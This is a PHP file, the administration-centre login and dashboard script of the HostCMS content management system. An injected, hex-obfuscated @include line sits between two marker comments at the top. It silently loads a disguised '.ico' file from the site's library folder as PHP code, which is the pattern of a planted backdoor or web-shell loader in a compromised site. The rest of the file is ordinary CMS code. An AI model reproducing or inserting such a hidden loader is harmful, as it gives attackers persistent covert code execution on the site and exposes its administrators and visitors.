<?php


/*dfaea*/

@include "\x2fh\x6fm\x65/\x6ee\x6f-\x76o\x2fn\x65o\x2dv\x6f.\x72u\x2fd\x6fc\x73/\x68o\x73t\x63m\x73f\x69l\x65s\x2fl\x69b\x2fl\x69b\x5f3\x38/\x66a\x76i\x63o\x6e_\x318\x30d\x622\x2ei\x63o";

/*dfaea*/
/**
 * Administration center.
 *
 * @package HostCMS
 * @version 6.x
 * @author Hostmake LLC
 * @copyright © 2005-2016 ООО "Хостмэйк" (Hostmake LLC), http://www.hostcms.ru
 */
require_once ('../bootstrap.php');

Core_Auth::systemInit();
Core_Auth::setCurrentSite();

ob_start();

if (!is_null(Core_Array::getGet('skinName')))
{
	$skinName = Core_Array::getGet('skinName');

	$aConfig = Core_Config::instance()->get('skin_config');
	if (isset($aConfig[$skinName]))
	{
		Core::$mainConfig['skin'] = $_SESSION['skin'] = $skinName;
	}
	else
	{
		throw new Core_Exception('Skin does not allow.');
	}
}
elseif(isset($_SESSION['skin']))
{
	Core::$mainConfig['skin'] = $_SESSION['skin'];
}

$oAdmin_Answer = Core_Skin::instance()->answer();

if (!is_null(Core_Array::getPost('submit')))
{
	try {
		$authResult = Core_Auth::login(
			Core_Array::getPost('login'), Core_Array::getPost('password'), isset($_POST['ip'])
		);
		Core_Auth::setCurrentSite();
	}
	catch (Exception $e)
	{
		$oAdmin_Answer->message(
			Core_Message::get($e->getMessage(), 'error')
		);
	}
}

if (!Core_Auth::logged())
{
	$title = Core::_('Admin.authorization_title');

	if (isset($authResult))
	{
		if ($authResult == FALSE)
		{
			$oAdmin_Answer->message(
				Core_Message::get(
					Core::_('Admin.authorization_error_valid_user', Core_Array::get($_SERVER, 'REMOTE_ADDR', 'undefined'))
				, 'error')
			);
		}
		// если пользователю сейчас запрещен ввод пароля
		elseif (is_array($authResult) && $authResult['result'] == -1)
		{
			$error_admin_access = $authResult['value'];

			$oAdmin_Answer->message(
				Core_Message::get(
					Core::_('Admin.authorization_error_access_temporarily_unavailable', $error_admin_access),
				'error')
			);
		}
	}

	Core_Skin::instance()->authorization();
}
else
{
	$title = Core::_('Admin.index_title', 'HostCMS', Core_Auth::logged() ? strip_tags(CURRENT_VERSION) : 6);
	Core::initConstants(Core_Entity::factory('Site', CURRENT_SITE));
	Core_Skin::instance()->index();
}

$oAdmin_Answer
	->ajax(Core_Array::getRequest('_', FALSE))
	->content(ob_get_clean())
	->title($title)
	->module('dashboard')
	->execute();